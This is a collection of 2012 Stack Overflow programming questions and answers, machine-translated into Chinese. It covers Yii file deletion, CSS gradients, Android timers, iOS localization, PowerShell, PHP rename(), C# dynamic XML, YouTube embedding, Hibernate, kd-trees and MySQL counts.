    rmdir(Yii::app()->request->baseUrl.'/uploads/'.$model->file_id);

这也不起作用，但出现错误**No such file or directory**。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-04T15:06:00.770

尝试：

```
unlink(getcwd().'/uploads/'.$model->file_id.'/'.$fileModel->file_name.$fileModel->extension); 
```

`getcwd()`获取当前工作目录。它的文档在[这里](http://php.net/manual/en/function.getcwd.php)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-04T14:11:48.930

代替

> Yii::app()->request->baseUrl

尝试

> Yii::app()->basePath

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-24T10:28:25.797

我从未使用过 Yii 的早期版本。

对于 Yii2： unlink(Yii::$app->basePath.'/directory_path/'.$filename);

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T16:03:06.777

我们也可以使用它

```
unlink($file->getFullPath()); 
```

# css - android Dolphin 9.0.1 上的 CSS 渐变渲染

> ID：13704736
> 
> 赞同：4
> 
> 时间：2012-12-04T14:06:34.703
> 
> 标签：css, android-browser, dolphin-browser

渐变属性在我的 android 海豚浏览器 9.0.1 版上无法正常工作。这是CSS：

```
position: absolute;
    top: 0;
    left: 0;
    width: 320px;
    height: 60px;

/* Mozilla Firefox */ 
background-image: -moz-linear-gradient(left, rgba(255,255,255,0) 66px, #171000 172px);

/* Webkit (Safari/Chrome 10) */ 
background-image: -webkit-gradient(linear, left top, right top, color-stop(0, rgba(17, 10, 0, 0)), color-stop(1, #171000));

/* Webkit (Chrome 11+) */ 
background-image: -webkit-linear-gradient(left,  rgba(17, 10, 0, 0) 66px, #171000 172px);

/* W3C Markup, IE10 Release Preview */ 
background-image: linear-gradient(to right, rgba(17, 10, 0, 0) 66px, #171000 172px); 
```

我是否必须为此浏览器添加另一条规则？据我所知，它使用 webkit，我不明白为什么它不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-09T12:01:30.220

**任何一个**

更改`color-stop(0, rgba(17, 10, 0, 0)), color-stop(1, #171000)`为

```
background-image:-webkit-gradient(linear, 0% 0%, 0% 100%, color-stop(0%, #a7cfdf), color-stop(100%, #23538a)); 
```

**或者**（如果上述解决方案没有帮助，那么您可以尝试一下）

```
background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#FFFFFF), to(#8C8C8C));
background: -webkit-linear-gradient(bottom, #8C8C8C,#FFFFFF ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-04T18:05:14.187

可能是由混合颜色格式（rgba 和 hex）引起的。
尝试使用：

```
/* Webkit (Safari/Chrome 10) */ 
background-image: -webkit-gradient(linear, left top, right top, color-stop(0%, rgba(17, 10, 0, 0)), color-stop(100%, rgba(23, 16, 0, 1))); 
```

或者

```
/* Webkit (Safari/Chrome 10) */ 
background-image: -webkit-gradient(linear, left top, right top, color-stop(0%, rgba(17, 10, 0, 0)), color-stop(100%, rgba(17, 10, 0, 1))); 
```

考虑到 rgb(17, 10, 0) 与 #171000 不同

# android - android上的计时器应用程序，线程

> ID：13704738
> 
> 赞同：0
> 
> 时间：2012-12-04T14:06:36.060
> 
> 标签：android, multithreading, service, timer

我必须在 android 上编写一个简单的 stopper 应用程序。

问题是即使应用程序处于后台（关闭活动），它也应该继续工作。

我应该在哪里保留计时器的线程？

我正在考虑在服务中执行此操作，但每隔几毫秒通过意图更新 UI 等等并不是很有效。

你怎么看 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:17:04.930

[您可以通过AlarmManager](http://developer.android.com/intl/ru/reference/android/app/AlarmManager.html)创建一个服务和调度来运行它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:23:32.730

TimerTask 是你所需要的，请阅读[这个](http://developer.android.com/reference/java/util/TimerTask.html)

# ios - 将 iPhone 应用程序翻译成中文

> ID：13704741
> 
> 赞同：-2
> 
> 时间：2012-12-04T14:06:47.073
> 
> 标签：ios, xcode, translate

我正在为一个客户制作一个应用程序，他问我是否可以为他制作中文版本，或者在应用程序中添加一个翻译按钮以使所有内容都变成中文。有没有办法在 Xcode 中做到这一点，或者有什么方法可以采用手机语言并翻译应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:12:52.927

您的问题涉及的范围很广，因此无法提供如此详细的答案。

国际化和本地化不是一项简单的任务。我建议通读文档，并使用 Apple 提供的示例和资源。具体看**编程资源**。[https://developer.apple.com/internationalization/](https://developer.apple.com/internationalization/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:28:36.123

最好的方法是让你的应用可本地化。要做到这一点：

1.  创建一个名为 Localizable.strings 的文件（名称和类型很重要）；
2.  选择创建的文件，然后按右侧窗格（文件检查器）上的“本地化...”按钮；
3.  选择英文，点击“本地化”；
4.  转到您的项目信息选项卡；
5.  此页面新增一个名为“Localizations”的项目，点击“+”图标，选择中文；
6.  选择要本地化的项目。这里我建议只让创建的文件 Localizable.strings 并单击 Finish；
7.  您将在 Localizable.strings 中看到一个可让您扩展的指示器。做它；
8.  您将看到两个文件：一个用于英文，另一个用于中文。您必须将文本与标识符一起放入两者中。这是一个例子：

    //英文 "start" = "开始："; “结束” = “结束：”；“新”=“新”；

    //中文 "开始" = "TextInChinese:"; "end" = "TextInChinese:"; "new" = "TextInChinese";

9.  为了在您的代码中访问这些信息，您必须使用以下代码：

_variable.text = [NSString stringWithFormat:NSLocalizedString(@"start", @"Some Comment you want to use")];

这将做你想要的工作。

# powershell - 如何列出不包含给定文件的所有目录？

> ID：13704743
> 
> 赞同：1
> 
> 时间：2012-12-04T14:06:46.200
> 
> 标签：powershell

我想列出 \MYNAS\Profiles\pc 的所有子文件夹，其中不包含名为“pålogging.txt”的文件。我设法用这个 oneliner 列出了所有实际包含这个文件的子文件夹：

```
ls . -r -filter "pålogging.txt" | %[$_.DirectoryName} | Get-Unique 
```

现在我想做与此完全相反的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:13:43.957

尝试这个：

```
Get-ChildItem -Recurse | 
Where-Object {$_.PSIsContainer -and -not (Test-Path "$($_.FullName)\pålogging.txt" -PathType Leaf) } 
```

# ios - CIPerspectiveTransform 的行为

> ID：13704747
> 
> 赞同：1
> 
> 时间：2012-12-04T14:07:06.170
> 
> 标签：ios, core-image, perspective, cifilter

我目前正在研究`CIPerspectiveTransform`，我似乎无法找到它的确切行为。至少我有一个想法，但我不太确定。我会公开我在这里发现的。

正如我们在[Core Image Filter Reference](https://developer.apple.com/library/mac/documentation/graphicsimaging/reference/CoreImageFilterReference/Reference/reference.html#//apple_ref/doc/filter/ci/CIPerspectiveTransform)中看到的那样，类型有 4 个属性`CIVector`：

```
inputTopLeft
A CIVector object whose attribute type is CIAttributeTypePosition and whose display name is Top Left.
Default value: [118 484]

inputTopRight
A CIVector object whose attribute type is CIAttributeTypePosition and whose display name is Top Right.

Default value: [646 507]

inputBottomRight
A CIVector object whose attribute type is CIAttributeTypePosition and whose display name is Bottom Right.
Default value: [548 140]

inputBottomLeft
A CIVector object whose attribute type is CIAttributeTypePosition and whose display name is Bottom Left.
Default value: [155 153] 
```

如您所见，默认值是非常随意的。但这会给给定图像带来透视效果。但是，这并不能真正帮助了解它是如何工作的。所以我开始为这些选择任意值`CIVector`。经过几次尝试，我发现这是：

```
[perspectiveFilter setValue:[CIVectorWithX:0 Y:200] forKey:@"inputTopLeft"];
[perspectiveFilter setValue:[CIVectorWithX:200 Y:200] forKey:@"inputTopRight"];
[perspectiveFilter setValue:[CIVectorWithX:0 Y:0] forKey:@"inputBottomLeft"];
[perspectiveFilter setValue:[CIVectorWithX:200 Y:0] forKey:@"inputBottomRight"]; 
```

应用于我的图像不会对其执行任何操作（我`UIImageView`是 a 的子视图`UIScrollView`）。所以我将值更改为 600x600，我发现除了结果图像的大小外，没有任何变化。第一种情况是 200x200，然后是 600x600。

所以这是我的问题：**为什么我的图像打印为 200x200 大小的正方形，而我在 iPhone 设备上工作并且它是完美的矩形？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-04T21:06:54.247

这些`CIVectors`描述了透视变换后图像角的期望位置。由于这些向量只有两个维度（X，Y），您可以将它们视为`CGPoints`新图像角点。

在您的示例中，您需要指定：

```
[perspectiveFilter setValue:[CIVectorWithX:50 Y:200] forKey:@"inputTopLeft"];
[perspectiveFilter setValue:[CIVectorWithX:150 Y:200] forKey:@"inputTopRight"]; 
```

获得类似于《星球大战》开场爬行的视角。

# php - PHP rename() 函数删除已存在的文件

> ID：13704750
> 
> 赞同：1
> 
> 时间：2012-12-04T14:07:13.267
> 
> 标签：php, file, rename, file-rename

我一直在环顾四周，`// if sucess`显然应该在文件重命名时执行：

`if(rename("$filepath$oldfilename", "$filepath$filename")===true) { // if success }`

不幸的是，由于这个函数会重命名文件，即使那里有另一个同名的文件，它总是成功的。

但更糟糕的是......由于另一个同名文件已经存在，它以某种方式被删除......

任何人都知道如何防止这种情况？为什么会这样？！

**附加信息：**

我让用户有机会通过文本区域更改文件名，当它发布时，重命名功能将启动：

```
 if(rename("$filepath$oldfilename", "$filepath$filename")===true)
        {
            $WhatToUpdateQueryResult = mysql_query($WhatToUpdateQuery) or die ("query fout ". mysql_error() );      

            if ($WhatToUpdateQueryResult == 1)
            {
                $uploadmsg = "Document name successfully updated.<br/> From: $oldfilename <br/> To: $filename.";
            }
        }
        else
        {
            $uploadmsg = "Can't update document. A file with the same name already exists.";
        } 
```

*注意：只要我将名称更改为尚不存在的名称，它就可以正常工作。但是，它总是以正确的方式结束。*

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:12:16.720

您必须创建一个函数来检查文件名是否已经存在：

```
function rename_if_free($newPath, $oldPath) {
    if (file_exists($newPath)) return false;
    else {
        rename($oldPath, $newPath);
        return true;
    }
} 
```

并将该函数放入您的**if**语句中。

现在它将是

```
if (rename_if_free($filepath.$oldfilename, $filepath.$filename) === true) { 
    $WhatToUpdateQueryResult = mysql_query($WhatToUpdateQuery) or die ("query fout ". mysql_error() );      

        if ($WhatToUpdateQueryResult == 1)
        {
            $uploadmsg = "Document name successfully updated.<br/> From: $oldfilename <br/> To: $filename.";
        }
}
else {
    $uploadmsg = "Can't update document. A file with the same name already exists.";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:10:55.670

[http://php.net/manual/en/function.move-uploaded-file.php](http://php.net/manual/en/function.move-uploaded-file.php)

取而代之`move_uploaded_file`。如果文件无法移动，这将返回 false。

编辑：啊，你不一定要上传？然后你必须手动检查目标文件是否已经存在，我假设。查看`file_exists()`

# c# - 使用动态将 XML 反序列化为对象

> ID：13704752
> 
> 赞同：47
> 
> 时间：2012-12-04T14:07:22.877
> 
> 标签：c#, xml, dynamic, deserialization, xmlserializer

是否可以将未知 XML 反序列化为如下对象？

```
 var xml = @"<Students><Student><Name>Arul</Name><Mark>90</Mark></Student></Students>";

 var serializer = new XmlSerializer(typeof(DynamicObject));

 dynamic students = serializer.Deserialize(new XmlTextReader(new StringReader(xml))); 
```

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2012-12-04T15:08:53.797

你可能想试试这个。

```
string xml = @"<Students>
                <Student ID=""100"">
                    <Name>Arul</Name>
                    <Mark>90</Mark>
                </Student>
                <Student>
                    <Name>Arul2</Name>
                    <Mark>80</Mark>
                </Student>
            </Students>";

dynamic students = DynamicXml.Parse(xml);

var id = students.Student[0].ID;
var name1 = students.Student[1].Name;

foreach(var std in students.Student)
{
    Console.WriteLine(std.Mark);
} 
```

* * *

```
public class DynamicXml : DynamicObject
{
    XElement _root;
    private DynamicXml(XElement root)
    {
        _root = root;
    }

    public static DynamicXml Parse(string xmlString)
    {
        return new DynamicXml(XDocument.Parse(xmlString).Root);
    }

    public static DynamicXml Load(string filename)
    {
        return new DynamicXml(XDocument.Load(filename).Root);
    }

    public override bool TryGetMember(GetMemberBinder binder, out object result)
    {
        result = null;

        var att = _root.Attribute(binder.Name);
        if (att != null)
        {
            result = att.Value;
            return true;
        }

        var nodes = _root.Elements(binder.Name);
        if (nodes.Count() > 1)
        {
            result = nodes.Select(n => n.HasElements ? (object)new DynamicXml(n) : n.Value).ToList();
            return true;
        }

        var node = _root.Element(binder.Name);
        if (node != null)
        {
            result = node.HasElements || node.HasAttributes ? (object)new DynamicXml(node) : node.Value;
            return true;
        }

        return true;
    }
} 
```

- 编辑 -

为了使它与 xml 命名空间一起工作，我添加了*RemoveNamespaces*方法。

```
public class DynamicXml : DynamicObject
{
    XElement _root;
    private DynamicXml(XElement root)
    {
        _root = root;
    }

    public static DynamicXml Parse(string xmlString)
    {
        return new DynamicXml(RemoveNamespaces(XDocument.Parse(xmlString).Root));
    }

    public static DynamicXml Load(string filename)
    {
        return new DynamicXml(RemoveNamespaces(XDocument.Load(filename).Root));
    }

    private static XElement RemoveNamespaces(XElement xElem)
    {
        var attrs = xElem.Attributes()
                    .Where(a => !a.IsNamespaceDeclaration)
                    .Select(a => new XAttribute(a.Name.LocalName, a.Value))
                    .ToList();

        if (!xElem.HasElements)
        {
            XElement xElement = new XElement(xElem.Name.LocalName, attrs);
            xElement.Value = xElem.Value;
            return xElement;
        }

        var newXElem = new XElement(xElem.Name.LocalName, xElem.Elements().Select(e => RemoveNamespaces(e)));
        newXElem.Add(attrs);
        return newXElem;
    }

    public override bool TryGetMember(GetMemberBinder binder, out object result)
    {
        result = null;

        var att = _root.Attribute(binder.Name);
        if (att != null)
        {
            result = att.Value;
            return true;
        }

        var nodes = _root.Elements(binder.Name);
        if (nodes.Count() > 1)
        {
            result = nodes.Select(n => n.HasElements ? (object)new DynamicXml(n) : n.Value).ToList();
            return true;
        }

        var node = _root.Element(binder.Name);
        if (node != null)
        {
            result = node.HasElements || node.HasAttributes ? (object)new DynamicXml(node) : node.Value;
            return true;
        }

        return true;
    }
} 
```

# php - 搜索 youtube 视频并在您的网页上观看

> ID：13704753
> 
> 赞同：0
> 
> 时间：2012-12-04T14:07:24.323
> 
> 标签：php, youtube, youtube-api

我正在构建一个具有搜索功能的网页，您可以在其中搜索 youtube 视频，点击搜索后，这些视频将显示在同一页面上。现在我想让它们也可以播放，所以当用户搜索歌曲时，它会将用户重定向到 youtube，但它会在同一页面播放视频。

这是我搜索 youtube 视频的代码：

```
?php      
// if form submitted
} else {
  // check for search keywords
  // trim whitespace
  // separate multiple keywords with /

  if (!isset($_POST['q']) || empty($_POST['q'])) {
    die ('ERROR: Please enter one or more search keywords');
  } 
  else {
    $q = $_POST['q'];
    //$q = preg_replace('[[:space:]]', '/', trim($q));

  }
  // set max results
  if (!isset($_POST['i']) || empty($_POST['i'])) {
    $i = 25;
  } else {
    $i = $_POST['i'];
  }

  // generate feed URL
  $feedURL = "http://gdata.youtube.com/feeds/api/videos/-/{$q}?orderby=viewCount&max-results={$i}";
  //$feedURL = "http://gdata.youtube.com/feeds/api/videos/-/eminem?orderby=viewCount&max-results=10";
  // read feed into SimpleXML object

  $sxml = simplexml_load_file($feedURL);
  //var_dump($sxml);

  // get summary counts from opensearch: namespace
  $counts = $sxml-> children('http://a9.com/-/spec/opensearchrss/1.0/');
  //$counts = $sxml-> children('http://www.opensearch.org/Specifications/OpenSearch/1.1');

  $total = $counts->totalResults;
  $startOffset = $counts->startIndex; 
  $endOffset = ($startOffset-1) + $counts->itemsPerPage;       
  ?>

  <h1>Search results</h1>
  <?php echo $total; ?> items found. Showing items 
  <?php echo $startOffset; ?> to <?php echo $endOffset; ?>:
  <p/>

  <table>
  <?php    
  // iterate over entries in resultset
  // print each entry's details
  foreach ($sxml->entry as $entry) {
    // get nodes in media: namespace for media information
    $media = $entry->children('http://search.yahoo.com/mrss/');

    // get video player URL
    $attrs = $media->group->player->attributes();
    $watch = $attrs['url']; 

    // get video thumbnail
    $attrs = $media->group->thumbnail[0]->attributes();
    $thumbnail = $attrs['url']; 

    // get <yt:duration> node for video length
    $yt = $media->children('http://gdata.youtube.com/schemas/2007');
    $attrs = $yt->duration->attributes();
    $length = $attrs['seconds']; 

    // get <gd:rating> node for video ratings
    $gd = $entry->children('http://schemas.google.com/g/2005'); 
    if ($gd->rating) {
      $attrs = $gd->rating->attributes();
      $rating = $attrs['average']; 
    } else {
      $rating = 0; 
    }

    // to get the video player
    $url = $watch;
    parse_str( parse_url( $url, PHP_URL_QUERY ), $video_id );

  }
}
?> 
```

我的问题是如何使用 youtube Iframe 播放我页面上的所有视频，而不是去 youtube 播放它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:29:28.747

视频 ID 在该 XML 文件内的多个不同位置可用。您可以加载 XML 的这一部分：

```
...<entry><id>http://gdata.youtube.com/feeds/api/videos/uelHwf8o7_U</id>... 
```

对其运行正则表达式以提取视频 ID，然后将该 ID 插入此代码中：

```
<?php $ajax_return = '<iframe width="560" height="315" src="http://www.youtube.com/embed/'.$youtube_ID.'" frameborder="0" allowfullscreen></iframe>'; ?> 
```

# facebook - 谷歌电视模拟器 - Facebook 问题

> ID：13704754
> 
> 赞同：0
> 
> 时间：2012-12-04T14:07:29.877
> 
> 标签：facebook, google-tv

我正在尝试在 Google TV 模拟器中访问 Facebook。

1.  Facebook SDK 适用于所有 android 平台，但不适用于 Google TV 模拟器。Google TV 是否支持 Facebook SDK。登录页面崩溃。

2.  也无法打开[https://www.facebook.com](https://www.facebook.com)

我们需要做一些具体的设置吗？

能否请您告诉我索尼 gs7 Google TV 会打开 URL。这是堆栈跟踪：

```
12-06 14:18:34.820: E/sighandler(1256): FailureSignalHandler for signal 4\.  Code 2.
12-06 14:18:34.820: E/sighandler(1256): Fault Address: 0xb7330fc8.
12-06 14:18:34.830: E/sighandler(1256): --- Stack trace: ---
12-06 14:18:34.830: E/sighandler(1256): PC: @ 0xb7330fc8  (unknown)
12-06 14:18:34.830: E/sighandler(1256):     @ 0xb766c4db        352
12-06 14:18:34.830: E/sighandler(1256):     @ 0xb783540c        976
12-06 14:18:34.830: E/sighandler(1256):     @ 0xb73311d3         80
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d9da2a5         64
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d5ec8a1         80
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d5ede43        112
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d827c5a         48
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d82553f         80   
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d825b07         80
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d825c69         48
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8267aa        192
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d815d2a         96
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d88b5ea        928
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d891633        720
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d884379        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d890f22        720
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d884379        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87c8c0        144
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d87ee64        128
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d883c7d        272
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d8699c1         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d927522        160
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d7d86fa        176
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d7d19c2         32
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d809c6b         80
12-06 14:18:34.830: E/sighandler(1256):     @ 0x9d809ccf         32
12-06 14:18:34.830: E/sighandler(1256): --- Memory Map: ---- 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T19:07:25.747

我们正在努力改进 Google TV 模拟器 - 即将（很快）对模拟器进行更新，可能会解决您的一些问题。您指出的网站确实可以在实体 Google TV 上正确加载（使用 Vizio Co-Star 进行测试）。

你能提供崩溃的日志转储吗？

# hibernate - 错误的插入和选择与自我关系多对多

> ID：13704761
> 
> 赞同：1
> 
> 时间：2012-12-04T14:07:46.430
> 
> 标签：hibernate, many-to-many, hibernate-annotations, discriminator, self-reference

我有一个抽象的超类“视图”

```
@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="tipo", length=1)
public abstract class View extends DefaultModel implements Serializable{
    private static final long serialVersionUID = -4850147998379161237L;

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    ...

    public abstract List<Institution> getInstitutions();
} 
```

儿童机构班

```
@Entity
@DiscriminatorValue("1")
public class Institution extends View implements Serializable {
    private static final long serialVersionUID = -18542249993446160L;

    @Override
    @JsonIgnore
    public List<Institution> getInstitutions() {
        return Lists.newArrayList(this);
    }

} 
```

和一个儿童团体

```
@Entity
@DiscriminatorValue("2")
public class GroupInstitution extends View {
    private static final long serialVersionUID = -6552513217676651258L;

    @ManyToMany
    List<Institution> institutions = new LinkedList<>();

    @Override
    @JsonIgnore
    public List<Institution> getInstitutions() {
        return institutions;
    }
} 
```

我保存了 3 个机构。好的。我试图用这三个机构拯救一个团体。这创建了一个新视图（类型 = 2）。但是关系表是这样的：

```
2, 1
2, 2
2, 3 
```

即用DiscriminatorValue代替GroupInstitution.id（我把DiscriminatorValue改成3，只是测试，关系是用3做的）

注释是错误的？

# computational-geometry - kd 树是否适合保留三角形，或者我需要对经典的 kd 树构建算法进行一些更改？

> ID：13704762
> 
> 赞同：4
> 
> 时间：2012-12-04T14:07:46.683
> 
> 标签：computational-geometry, nearest-neighbor, kdtree

我在 wiki 中阅读了 kd 树描述，wiki 说 kd 树保留点。我有三角形网格，需要一些结构来有效计算与圆柱体的交点和点到点的距离查询。据我了解，如果我按平面分割网格 - 许多三角形可以与该平面相交。那我该怎么办？将三角形的副本放在左右子框中，还是分割相交的三角形？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T14:46:37.350

您需要拆分相交的三角形。查看任何使用 KD-Trees 的开源光线追踪算法以了解如何执行此操作，或在 Google Scholar 上搜索学术论文。

查看 Surface Area Heuristic 以了解选择分割平面的好方法，它通常用于光线追踪，但它可能适用于您的情况。

# mysql - 在大表mysql上选择计数（*）

> ID：13704768
> 
> 赞同：2
> 
> 时间：2012-12-04T14:08:10.443
> 
> 标签：mysql

我有一个大表（大约 150 M 行），如果我尝试在其上运行一个简单的 select count(*)，那么 mysql 工作大约一个小时然后抛出一个错误。

我假设这不是由于 mysql 的限制，而是我这边的问题，但我不知道从哪里开始寻找。有任何想法吗？

该表是linux上的innodb mysql 5.5

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:12:08.713

你可以用这样的表状态检查它

```
 SHOW TABLE STATUS FROM db_name LIKE 'table_name'; 
```

你看到 rows 列....

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:15:49.983

您可以使用`count(1) instead of count(*)`

尝试 ：：

```
Select count(1) from my_table 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:34:29.640

加快此类查询的最简单方法是使用[覆盖索引](http://en.wikipedia.org/wiki/Index_%28database%29#Covering_Index)。这将允许您扫描所需的行，但每行需要更少的 I/O 字节（因为您只扫描每行数据的一部分，而不是整行）。此外，如果您的索引以与查询相同的方式排序，您可以避免排序成本并且可以扫描的行数大大减少。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-11T09:55:21.540

您可以使用[信息架构](https://dev.mysql.com/doc/refman/5.7/en/tables-table.html)。

> 从 INFORMATION_SCHEMA.TABLES 中选择 TABLE_ROWS，其中 table_schema = YOUR_DB_NAME AND table_name = YOUR_TABLE_NAME

# java - nutch 有网络服务 API 吗？

> ID：13704773
> 
> 赞同：0
> 
> 时间：2012-12-04T14:08:28.910
> 
> 标签：java, nutch

我知道 Nutch 有可以在 java 项目中使用的命令，但是 Nutch 有 Web 服务作为 API 吗？（例如，像 ElasticSearch REST API）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T21:11:55.923

在本文档 ( [http://www.apache.org/dist/nutch/2.1/CHANGES-2.1.txt](http://www.apache.org/dist/nutch/2.1/CHANGES-2.1.txt) ) 中，您会看到 nutch 有一个 REST API。这是它的样子： http: [//nutch.apache.org/apidocs-2.0/index.html](http://nutch.apache.org/apidocs-2.0/index.html)

你的具体问题是什么？

# function - Powershell：带有包含参数的开关的函数

> ID：13704774
> 
> 赞同：0
> 
> 时间：2012-12-04T14:08:34.047
> 
> 标签：function, powershell, windows-7, parameters

所以我正在尝试编写一个使用开关参数的脚本，并且我还需要参数来配合它们。例如，

```
Function Foo ($X, $Z, [switch]$Y, $Yarg, [switch]$K, $Karg){
  if($Y){
    $Yup = $Yarg
  }

  if($K){
    $Y = $Karg
  }Else{$Y = 42}

  $X + $Z / $Yup

} 
```

本质上我想问一下开关是否在那里，如果它在那里，我希望它使用 $Yarg 变量，目前当我这样做时，我得到一个错误，说开关只能是一个布尔值。然后其余代码失败。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:14:35.237

我的假设是 Y 和 K 是互斥的参数集，而 X 和 Z 是共同的，并且是强制性的。如果既未指定 -Y 也未指定 -K，则默认值为 -Y。为了清楚起见，我在这里使用了备用参数声明语法：

```
function Foo(
    [cmdletbinding(defaultparametersetname="setY")]
    param(
        [parameter(mandatory=$true)]
        $X,

        [parameter(mandatory=$true)]
        $Y

        [parameter(parametersetname="setY")]
        [switch]$Y,

        [parameter(parametersetname="setY", mandatory=$true)]
        $YArg,

        [parameter(parametersetname="setK")]
        [switch]$K,

        [parameter(parametersetname="setK", mandatory=$true)]
        $KArg,
    )
    # do work
) 
```

我希望语法应该很明显。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T17:28:12.100

所以我打算做的是制作一个函数，你可以在其中输入像这样的变量

```
foo x z -y yarg -k karg 
```

主要需要**-y yarg**类型变量条目。

为了能够做到这一点，我认为我需要使用开关，但实际上我只需要非强制性参数。

```
 function Foo(
    [cmdletbinding(defaultparametersetname="setY")]
    param(
        [parameter(mandatory=$true, position=0)]
        $X,

        [parameter(mandatory=$true, position=1)]
        $Z

        [parameter(mandatory=$false)]
        $Y,

        [parameter(mandatory=$false)]
        $K
    )
    # do work
) 
```

这似乎更容易，而且有效！

# java - 安卓应用菜单设计

> ID：13704775
> 
> 赞同：0
> 
> 时间：2012-12-04T14:08:34.437
> 
> 标签：java, android, android-layout

我是 android 开发的新手，我正在创建我的第一个应用程序。

我想在我的主屏幕上设计一个菜单，如下图所示。4 个带有图像的选项卡，每个选项卡打开一个不同的屏幕。

任何人都可以给我抬头。我正在阅读 android 开发人员指南，但找不到我应该查看的部分。

